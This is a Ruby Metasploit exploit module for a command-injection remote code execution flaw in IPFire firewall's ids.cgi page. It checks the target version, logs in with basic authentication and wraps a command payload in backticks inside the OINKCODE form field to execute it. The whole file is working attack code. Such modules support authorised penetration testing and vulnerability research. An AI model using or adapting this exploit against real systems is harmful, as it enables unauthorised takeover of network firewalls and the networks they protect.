##
## This module requires Metasploit: https://metasploit.com/download
## Current source: https://github.com/rapid7/metasploit-framework
###

class MetasploitModule < Msf::Exploit::Remote
  include Msf::Exploit::Remote::HttpClient

  Rank = ExcellentRanking
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'        => 'IPFire proxy.cgi RCE',
        'Description' => %q(
          IPFire, a free linux based open source firewall distribution,
          version < 2.19 Update Core 110 contains a remote command execution
          vulnerability in the ids.cgi page in the OINKCODE field.
        ),
        'Author'      =>
          [
            'h00die <mike@stcyrsecurity.com>', # module
            '0x09AL'                         # discovery
          ],
        'References'  =>
          [
            [ 'EDB', '42149' ]
          ],
        'License'        => MSF_LICENSE,
        'Platform'       => 'unix',
        'Privileged'     => false,
        'DefaultOptions' => { 'SSL' => true },
        'Arch'           => [ ARCH_CMD ],
        'Payload'        =>
          {
            'Compat' =>
              {
                'PayloadType' => 'cmd',
                'RequiredCmd' => 'perl awk openssl'
              }
          },
        'Targets'        =>
          [
            [ 'Automatic Target', {}]
          ],
        'DefaultTarget' => 0,
        'DisclosureDate' => 'Jun 09 2017'
      )
    )

    register_options(
      [
        OptString.new('USERNAME', [ true, 'User to login with', 'admin']),
        OptString.new('PASSWORD', [ false, 'Password to login with', '']),
        Opt::RPORT(444)
      ]
    )
  end

  def check
    begin
      # authorization header required, see https://github.com/rapid7/metasploit-framework/pull/6433#r56764179
      # after a chat with @bcoles in IRC.
      res = send_request_cgi(
        'uri'           => '/cgi-bin/pakfire.cgi',
        'method'        => 'GET',
        'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
      )

      if res && res.code == 200
        /\<strong\>IPFire (?<version>[\d.]{4}) \([\w]+\) - Core Update (?<update>[\d]+)/ =~ res.body
      end
      if version.nil? || update.nil? || !Gem::Version.correct?(version)
        vprint_error('No Recognizable Version Found')
        CheckCode::Safe
      elsif Gem::Version.new(version) <= Gem::Version.new('2.19') && update.to_i <= 110
        CheckCode::Appears
      else
        vprint_error('Version and/or Update Not Supported')
        CheckCode::Safe
      end
    rescue ::Rex::ConnectionError
      print_error("Connection Failed")
      CheckCode::Safe
    end
  end

  def exploit
    begin
      # authorization header required, see https://github.com/rapid7/metasploit-framework/pull/6433#r56764179
      # after a chat with @bcoles in IRC.
      vprint_status('Sending request')
      res = send_request_cgi(
        'uri'           => '/cgi-bin/ids.cgi',
        'method'        => 'POST',
        'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
        'headers'       =>
          {
            'Referer' => "#{datastore['SSL'] ? 'https' : 'http'}://#{datastore['RHOST']}:#{datastore['RPORT']}/cgi-bin/ids.cgi"
          },
        'vars_post'          => {
          'ENABLE_SNORT_GREEN' => 'on',
          'ENABLE_SNORT' => 'on',
          'RULES' => 'registered',
          'OINKCODE' => "`#{payload.encoded}`",
          'ACTION' => 'Download new ruleset',
          'ACTION2' => 'snort'
          }
      )

      # success means we hang our session, and wont get back a response, so just check we get a response back
      if res && res.code != 200
        fail_with(Failure::UnexpectedReply, "#{peer} - Invalid credentials (response code: #{res.code})")
      end
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
    end
  end
end